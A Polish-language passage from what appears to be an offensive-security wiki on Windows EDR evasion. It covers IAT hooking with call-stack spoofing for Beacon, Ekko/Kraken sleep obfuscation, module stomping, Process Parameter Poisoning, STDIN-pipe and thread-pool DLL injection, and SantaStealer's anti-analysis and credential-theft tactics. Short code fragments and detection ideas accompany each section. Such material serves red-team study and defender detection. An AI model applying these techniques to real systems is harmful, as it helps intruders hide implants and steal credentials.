  - Maskowanie/odmaskowywanie pamięci wokół wywołania (np. szyfrowanie obszarów beacona, zmiana RWX→RX, zmiana nazw/ustawień uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
  - Call-stack spoofing: utworzenie wiarygodnego stosu i przejście do docelowego API, tak aby analiza call stacka wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zachowania zgodności udostępnij interfejs, za pomocą którego skrypt Aggressor (lub odpowiednik) może rejestrować API do hookowania dla Beacona, BOF-ów i bibliotek DLL używanych w post-exploitation.

Dlaczego w tym przypadku warto użyć IAT hooking
- Działa z dowolnym kodem korzystającym z hookowanego importu, bez modyfikowania kodu narzędzia i bez polegania na tym, że Beacon będzie pośredniczył w konkretnych wywołaniach API.
- Obejmuje biblioteki DLL używane w post-exploitation: hookowanie LoadLibrary* umożliwia przechwytywanie ładowania modułów (np. System.Management.Automation.dll, clr.dll) i stosowanie tych samych technik maskowania oraz evasion call stacka wobec ich wywołań API.
- Dzięki wrapperom CreateProcessA/W przywraca niezawodne działanie poleceń post-exploitation tworzących procesy wobec mechanizmów detekcji opartych na call stacku.

Minimalny szkic IAT hooka (pseudokod C/C++ dla x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Uwagi
- Zastosuj patch po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loadery, takie jak TitanLdr/AceLdr, pokazują, jak wykonywać hooking w DllMain ładowanego modułu.
- Wrappery powinny być małe i bezpieczne dla PIC; prawdziwe API należy rozwiązywać przez oryginalną wartość IAT przechwyconą przed patchowaniem albo przez LdrGetProcedureAddress.
- W przypadku PIC stosuj przejścia RW → RX i unikaj pozostawiania stron z uprawnieniami do zapisu i wykonywania.

Stub do spoofingu call stacka
- Stub’y PIC w stylu Draugr tworzą fałszywy łańcuch wywołań (adresy powrotu w niezłośliwych modułach), a następnie przechodzą do prawdziwego API.
- Pozwala to obejść detekcje, które oczekują kanonicznych stacków pochodzących z Beacon/BOFs przy wywołaniach wrażliwych API.
- Połącz to z technikami stack cutting/stack stitching, aby przed prologiem API wylądować wewnątrz oczekiwanych ramek.

Integracja operacyjna
- Dodaj reflective loader na początku DLL post-ex, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL.
- Użyj skryptu Aggressor do rejestrowania docelowych API, aby Beacon i BOFs mogły przejrzyście korzystać z tej samej ścieżki evasion bez zmian w kodzie.

Kwestie detekcji/DFIR
- Integralność IAT: wpisy wskazujące adresy spoza image (heap/anon); okresowa weryfikacja wskaźników importów.
- Anomalie stacka: adresy powrotu nienależące do załadowanych image; nagłe przejścia do niebędącego image PIC; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy do IAT wewnątrz procesu, wczesna aktywność DllMain modyfikująca thunk importu, nieoczekiwane obszary RX tworzone podczas ładowania.
- Omijanie image-load: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania zestawów automation/clr skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy i przykłady
- Reflective loadery wykonujące patchowanie IAT podczas ładowania (np. TitanLdr, AceLdr)
- Hooki maskujące pamięć (np. simplehook) i PIC do stack cutting (stackcutting)
- Stub’y PIC do spoofingu call stacka (np. Draugr)


## Hookowanie IAT podczas importu + sleep obfuscation (Crystal Palace/PICO)

### Hooki IAT podczas importu za pomocą rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera `GetProcAddress` własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Utwórz **rezydentny PICO** (trwały obiekt PIC), który przetrwa po zwolnieniu się tymczasowego loadera PIC.
- Wyeksportuj funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy ordinalne i używaj wyszukiwania hooków na podstawie hashy, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie wywołaj prawdziwe `GetProcAddress`.
- Zarejestruj cele hooków podczas linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje poprawny, ponieważ znajduje się wewnątrz rezydentnego PICO.

Dzięki temu uzyskujesz **przekierowanie IAT podczas importu** bez patchowania sekcji kodu załadowanej DLL po załadowaniu.

### Wymuszanie importów możliwych do hookowania, gdy cel używa PEB-walking

Hooki podczas importu zadziałają tylko wtedy, gdy funkcja rzeczywiście znajduje się w IAT celu. Jeśli moduł rozwiązuje API przez PEB-walk + hash (bez wpisu importu), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera mogła go obsłużyć:

- Zastąp rozwiązywanie wyeksportowanych funkcji na podstawie hashy (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, co umożliwi przechwycenie importu przez reflective loader.

### Obfuscation snu/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch obfuscation w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z odpowiednio przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz jako `PAGE_READWRITE` → zaszyfruj RC4 przez `advapi32!SystemFunction032` cały zmapowany obraz → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` zapewnia szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy etap.

Szczegół operacyjny: dla długiego oczekiwania zwracaj „success” (np. `WAIT_OBJECT_0`), aby wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami w czasie bezczynności i pozwala uniknąć klasycznej sygnatury „patchowanego `Sleep()`”.

Pomysły na detekcję (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` obejmujące duży zakres, po którym następuje przywrócenie uprawnień poszczególnych sekcji.

### Rejestracja CFG w czasie działania dla gadżetów sleep-obfuscation

W celach z włączonym CFG pierwszy pośredni skok do gadżetu wewnątrz funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje awarię procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżet nie znajduje się w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w zahartowanych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy pośredni cel używany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` oraz wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych image (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy image** i obejmować **cały rozmiar image**.
- W przypadku ręcznie mapowanych/obsługujących PIC/zmodyfikowanych obszarów użyj **bazy alokacji** i jej rozmiaru.
- Oznacz nie tylko gadżet dispatchujący, ale także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe wait/event) oraz wszystkie sekcje wykonywalne kontrolowane przez atakującego, które staną się pośrednimi celami.

Dzięki temu łańcuchy sleep w stylu ROP/JOP zmieniają się z „działa tylko w procesach bez CFG” w wielokrotnego użytku prymityw dla `explorer.exe`, przeglądarek, `svchost.exe` i innych endpointów skompilowanych z `/guard:cf`.

### Spoofing stacka zgodny z CET dla usypianych wątków

Pełna podmiana `CONTEXT` jest łatwa do wykrycia i może zawodzić w systemach CET Shadow Stack, ponieważ spoofowany `Rip` musi nadal zgadzać się ze sprzętowym shadow stackiem. Bezpieczniejszy wzorzec maskowania snu to:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stacka `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Zrób kopię zapasową prawdziwego TEB/TIB bieżącego wątku.
- Przechwyć prawdziwy kontekst usypianego wątku za pomocą `GetThreadContext`.
- Skopiuj **wyłącznie** prawdziwy `Rip` do spoofowanego kontekstu, pozostawiając spoofowany stan `Rsp`/stacka bez zmian.
- Podczas snu skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby stack walkery rozwijały stack w prawidłowym zakresie.
- Po zakończeniu oczekiwania przywróć oryginalny TIB i kontekst wątku.

Pozwala to zachować zgodny z CET wskaźnik instrukcji, a jednocześnie wprowadza w błąd stack walkery EDR, które polegają na metadanych stacka TEB przy weryfikacji rozwijania stacka.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch z timer queue jest zbyt łatwy do rozpoznania po sygnaturze, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z zawieszonego wątku pomocniczego za pomocą kolejkowanych APC:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako punktem wejścia.
- Kolejkuj przygotowane ramki `CONTEXT`/APC za pomocą `NtQueueApcThread` i opróżniaj je przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na heapie, a nie na stacku wątku pomocniczego, aby uniknąć wyczerpania domyślnego stacka wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować działanie.
- Zawieś główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → przywrócenie → `NtResumeThread`), aby zmniejszyć okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stack.

Zastępuje to sygnaturę `CreateTimerQueueTimer` + `NtContinue` sygnaturą wątku pomocniczego/APC, zachowując jednocześnie te same cele maskowania RC4 i spoofingu stacka.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed snem, oczekiwaniem lub dispatchowaniem APC.
- `GetThreadContext`/`SetThreadContext` opakowujące `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stacka TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread` prowadzące pośrednio do `SystemFunction032`, `VirtualProtect` lub helperów przywracających uprawnienia sekcji.
- Wielokrotne użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako pivotów dispatchujących wewnątrz podpisanych modułów.


## Precyzyjny Module Stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL już zmapowanej w procesie docelowym**, zamiast alokować oczywistą prywatną pamięć wykonywalną lub ładować nową, poświęconą DLL. Celem nadpisania powinien być **załadowany obraz oparty na pliku na dysku**, którego przestrzeń kodu pomieści payload bez uszkodzenia ścieżek kodu nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwny stomping popularnych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodny: DLL może nie być załadowana w procesie zdalnym, a zbyt mały obszar kodu spowoduje awarię procesu. Bardziej niezawodny workflow:

1. Wylicz moduły procesu docelowego i zachowaj **listę dozwolonych nazw** już załadowanych DLL.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydackie DLL na dysku i porównaj rozmiar **`.text` `Misc_VirtualSize`** sekcji PE z rozmiarem payloadu. To ważniejsze niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zmapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA wyeksportowanej funkcji jako początkowy offset stompu.
5. Oblicz **zasięg nadpisania**: jeśli payload przekroczy granicę wybranej funkcji, nadpisze sąsiednie eksporty umieszczone za nią w pamięci.

Typowe helpery do rekonesansu/wyboru spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Uwagi operacyjne
- Preferuj DLL-e **już załadowane** w zdalnym procesie, aby uniknąć telemetryki związanej z `LoadLibrary`/nieoczekiwanymi załadowaniami obrazów.
- Preferuj eksporty rzadko wykonywane przez aplikację docelową; w przeciwnym razie normalne ścieżki kodu mogą trafić na nadpisane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode’u z literału tekstowego na **tablicę bajtów/inicjalizator klamrowy**, aby cały bufor był poprawnie reprezentowany w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do **stron wykonywalnych opartych na obrazie** (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast do częściej spotykanych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie są już zgodne z plikiem źródłowym na dysku.
- Zdalne wątki lub przełączenia kontekstu, które rozpoczynają wykonywanie w obrębie eksportu legalnej DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` dotyczące stron `.text` DLL, po których następuje tworzenie wątku.

## Zatruwanie parametrów procesu (P3)

Process Parameter Poisoning (P3) to technika **wstrzykiwania do procesu / omijania EDR**, która pozwala uniknąć klasycznej ścieżki zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już działającego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatrucie, kopiowane przez `CreateProcessW`

Przydatne nośniki:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia praktyczne dotyczące nośników:

- `lpCommandLine` musi wskazywać **zapisywalną pamięć** dla `CreateProcessW`, a jego limit wynosi **32 767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode złożonym z kolejnych ciągów `NAZWA=WARTOŚĆ\0`, zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu zwykłe tworzenie procesu staje się **prymitywem transferu payloadu**. Operator tworzy proces potomny z danymi startowymi kontrolowanymi przez atakującego, a Windows wykonuje kopiowanie między procesami.

### Przepływ zdalnego wyszukiwania bez zdalnych API zapisu

Po utworzeniu procesu potomnego rozwiąż adres skopiowanego bufora za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Przejdź do `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przepływ:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów zwykle ma uprawnienia `RW`, a nie jest wykonywalny. Typowy łańcuch P3 wygląda następująco:

1. Utwórz proces normalnie (nie w stanie wstrzymania)
2. Ustaw wybranej stronie parametrów uprawnienia wykonywania za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonywanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisz `RIP`)

W przeciwieństwie do klasycznych metod hijackingu wątku nie wymaga to użycia `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio za pomocą zwróconego uchwytu głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtem null i etapowy shellcode

Wszystkie trzy nośniki zawierają **dane tekstowe lub przypominające tekst**, dlatego surowy payload zawierający `0x00` zostaje ucięty podczas transferu. Praktycznym obejściem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie działania, a następnie ładuje dowolny drugi etap.

Prosty wzorzec polega na syntezie stałych z użyciem XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Pozwala to pierwszemu etapowi tworzyć na stosie ciągi znaków, argumenty API, ścieżki DLL lub loader shellcode drugiego etapu bez osadzania bajtów null w przesyłanym parametrze.

### Wywołania API ze stosu w pierwszym etapie

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg znaków/bufor na stosie procesu docelowego
- zarezerwować **32-bajtowy shadow space x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Następnie drugi etap można skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej uprawnienia na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i wykonać skok do niej, unikając bezpośredniej alokacji RWX.

### Pomysły na wykrywanie

Autorzy wskazali następujące obiecujące obszary do analizy:

- użycie `VirtualProtectEx` / `NtProtectVirtualMemory` do nadania **stronom parametrów procesu uprawnień do wykonywania**
- zmiana tych uprawnień, po której następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved`, bądź takie o wysokiej entropii, podczas tworzenia procesu

### Uwagi

- P3 to **sposób na transfer między procesami**, a nie samodzielna, kompletna metoda wykonywania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie i przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

Aby dostarczyć payload do **istniejącego** procesu Windows za pośrednictwem opisów wątków, a następnie przejąć adres powrotu uśpionego wątku, zobacz [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Wstrzykiwanie przez potok STDIN konsoli

Interaktywny proces potomny konsoli może również służyć jako **prymityw transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do potoku i wysyła marker, po którym następuje shellcode. Gdy program konsolowy odczyta dane do własnej, prywatnej pamięci, injector odnajduje ten bufor, nadaje mu uprawnienia do wykonywania i przekierowuje do niego wątek procesu potomnego. Pozwala to uniknąć użycia `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to process injection, a nie ogólna metoda obejścia EDR.<sup>[[41]](#references)</sup>

Pomimo określenia „named-pipe” implementacja referencyjna wywołuje `CreatePipe`, które tworzy **potok anonimowy**. Windows implementuje potoki anonimowe przy użyciu wewnętrznych obiektów potoków o unikalnych nazwach, ale PoC ani nie wybiera ścieżki `\\.\pipe\<name>`, ani nie wywołuje `CreateNamedPipe`. Tworzy dziedziczone uchwyty z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego ten PoC uruchamia podany plik wykonywalny konsoli; nie podłącza potoku do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Przebieg działania według implementacji referencyjnej

Implementacja wykorzystuje następujący łańcuch:<sup>[[41]](#references)</sup>

1. Utwórz pary potoków anonimowych dla `STDIN` i `STDOUT` procesu potomnego. Wyłącz dziedziczenie dla dwóch uchwytów po stronie procesu nadrzędnego i zamknij w nim kopie uchwytów po stronie procesu potomnego po utworzeniu procesu.
2. Uruchom interaktywny plik wykonywalny, taki jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane standardowe uchwyty.
3. Wyślij całą binarną tablicę `rawData` za pomocą `WriteFile` przez uchwyt `STDIN` po stronie procesu nadrzędnego. Program konsolowy odczytuje bajty i pozostawia ich kopię w jednym ze swoich prywatnych, zatwierdzonych obszarów pamięci.
4. Przejdź przestrzeń adresową procesu potomnego za pomocą `VirtualQueryEx`, odczytaj kandydackie obszary `MEM_PRIVATE` przez `ReadProcessMemory` i wyszukaj marker na początku `rawData`.
5. Zmień uprawnienia odnalezionego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikuj główny wątek, wstrzymaj go, ustaw `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread` i wznów jego działanie.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest specyficzna dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się od 25-bajtowego znacznika, więc wykonywalne bajty zaczynają się pod offsetem szesnastkowym `0x19`. Przy zastępowaniu payloadu zachowaj ten układ albo zaktualizuj jednocześnie znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają też `0x0A`, `0x0D` i `0x1A` jako niedozwolone znaki. Ten workflow nie zmienia tokena ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Wzorce tworzenia małych natywnych helperów i kompilowania payloadów znajdziesz w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Wstrzykiwanie DLL przez callback puli wątków bez shellcode (DLLParty)

DLLParty adaptuje wstrzykiwanie do puli wątków w stylu PoolParty tak, aby istniejący worker procesu docelowego wywołał `LoadLibraryA`, zamiast wykonywać wstrzyknięty stub callbacku. Jego prymitywem dyspozycji jest obiekt `TP_DIRECT` umieszczany w kolejce portu ukończenia wejścia/wyjścia puli docelowej. Nie omija to uprawnień procesu: PoC wywołuje `OpenProcess(PROCESS_ALL_ACCESS)` i wymaga pamięci procesu docelowego z prawami odczytu i zapisu oraz uchwytów workera i portu ukończenia, które można zduplikować.<sup>[[46]](#references)[[47]](#references)</sup>

W Windows x64 worker przekazuje wskaźnik do instancji `TP_CALLBACK_INSTANCE` umieszczonej na jego stosie w `RCX`, czyli pierwszym argumencie callbacku. `LoadLibraryA` interpretuje ten sam wskaźnik jako `LPCSTR`. Na testowanej ścieżce `TppWorkerThread` tworzy wskaźnik pod `RSP+0x178`, a pierwszy zwykły zapis do tego obiektu wykonuje pod `RSP+0x1d0`. Ścieżka DLL zakończona znakiem null, mieszcząca się w tym prefiksie o długości 0x58 bajtów, może zatem znaleźć się na początku instancji i nie zostanie nadpisana przed dyspozycją. To obserwacja specyficzna dla danego buildu, a nie udokumentowana gwarancja ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Referencyjny workflow wygląda następująco:<sup>[[46]](#references)[[47]](#references)</sup>

1. Wylicz uchwyty procesu docelowego za pomocą `NtQuerySystemInformation(SystemHandleInformation)` i zidentyfikuj `TpWorkerFactory`, sprawdzając typy obiektów. Zduplikuj uchwyt worker factory i pobierz `WorkerFactoryBasicInformation`; `StartParameter` wskazuje zdalny `TP_POOL`. Pomiń fabryki, dla których `TotalWorkerCount == 0`.
2. Odczytaj `TP_POOL.CompletionPort` i przejdź przez prywatną listę workerów puli. W testowanym buildzie Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) jej głowa znajduje się pod `pool+0x60`; każde łącze pod `worker+0x10`, więc slot instancji callbacku pod `worker+0x38` odpowiada `link+0x28`. PoC sprawdza wyrównanie wskaźników, wzajemność łączy, przynależność do puli, niezerowe identyfikatory wątków, powtarzające się węzły i stabilność głowy listy.
3. Zapisz ścieżkę DLL we **wszystkich** odzyskanych slotach workerów, ponieważ ukończenie umieszczone w kolejce może zostać odebrane przez dowolnego workera. Umieść `TP_DIRECT` z `Callback = LoadLibraryA` w zapisywalnej pamięci procesu docelowego. PoC używa `last_slot-0x500` na stosie workera zamiast `VirtualAllocEx`; ten offset jest eksperymentalny i nie może kolidować z aktywnymi danymi stosu.
4. Zduplikuj uchwyt portu ukończenia procesu docelowego i wywołaj `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adres zdalnego `TP_DIRECT` jest kluczem ukończenia. Istniejący worker wywoła następnie `LoadLibraryA` z nadpisanym wskaźnikiem instancji callbacku, ładując DLL, do której proces docelowy ma dostęp.

PoC przyjmuje PID procesu docelowego (`DLLParty.exe <target_pid>`) i używa zakodowanej na stałe ścieżki DLL w `DLLParty.cpp`; przed zbudowaniem pliku wykonywalnego x64 ustaw ścieżkę dostępną dla procesu docelowego. Używa też adresu `LoadLibraryA` z własnego procesu jako zdalnego callbacku, zakładając, że adres ten jest prawidłowy w procesie docelowym. Kod nie sprawdza długości ścieżki względem prefiksu o długości 0x58 bajtów ani tego, czy podczas przechodzenia listy workerów znaleziono slot przed indeksowaniem ostatniego elementu. Ponownie zweryfikuj prywatne offsety, układ stosu i dostępną do zapisu przestrzeń dla danego buildu. Pominięcie `CreateRemoteThreadEx`, shellcode i `VirtualAllocEx` nie eliminuje zapisów między procesami ani telemetrii ładowania DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktyki SantaStealer służące do unikania wykrycia bez plików i kradzieży danych uwierzytelniających

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne info-stealery łączą omijanie AV, anti-analysis i dostęp do danych uwierzytelniających w ramach jednego workflow.<sup>[[24]](#references)</sup>

### Filtrowanie według układu klawiatury i opóźnienie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli zostanie wykryty układ cyrylicki, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nie aktywuje się w wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt przydatny do wykrywania.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, oblicza dla każdej nazwy własną sumę kontrolną z algorytmem rolling checksum i porównuje ją z wbudowanymi blocklistami debuggerów/sandboxów; powtarza obliczanie sumy kontrolnej dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, krótki czas od uruchomienia), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, oraz wykonuje pomiary czasu wokół operacji uśpienia, by wykryć single-stepping. Każde wykrycie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + podwójne reflective loading z ChaCha20

- Główna DLL/EXE zawiera wbudowany Chromium credential helper, który jest zapisywany na dysku lub ręcznie mapowany w pamięci; w trybie fileless samodzielnie rozwiązuje imports/relocations, dzięki czemu nie powstają żadne pliki helpera.
- Ten helper przechowuje DLL drugiego etapu, dwukrotnie zaszyfrowaną ChaCha20 (dwa klucze 32-bajtowe + nonce o długości 12 bajtów). Po obu etapach deszyfrowania ładuje blob refleksyjnie (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
